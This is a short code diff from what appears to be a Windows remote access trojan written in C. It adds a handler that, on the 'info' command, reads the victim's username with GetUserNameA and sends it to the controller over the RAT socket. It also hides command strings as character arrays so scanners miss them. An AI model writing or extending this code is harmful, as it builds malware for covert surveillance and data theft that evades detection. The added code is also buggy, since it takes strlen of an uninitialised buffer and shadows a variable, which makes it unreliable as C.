@@ -139,11 +139,23 @@ WinMain(HINSTANCE hInstance,
 			OutputDebugStringA("Error receiving message.");
 		}
 		
-		OutputDebugStringA("Received: ");	
-		if ( strcmp(recvBuffer, "info") == 0 )
+		OutputDebugStringA("Received: ");
+		char ca_info[] = { 'i','n','f','o',0 };
+		if ( strcmp(recvBuffer, ca_info) == 0 )
 		{
-			OutputDebugStringA("Got info.\n");
-			SocketSend(&ratSocket, "Test2");
+			char buffer[256];
+			DWORD len = strlen(buffer);
+			if ( GetUserNameA(buffer, &len) <= 0 )
+			{
+				char ca_unknown[] = { 'u','n','k','n','o','w','n', 0 };
+				strncpy(buffer, ca_unknown, sizeof(ca_unknown));
+
+				char buffer[256];
+				sprintf(buffer, "Could not get username: %ld\n", GetLastError());
+				OutputDebugStringA(buffer);
+			}
+			
+			SocketSend(&ratSocket, buffer);
 		}
 		else
 		{
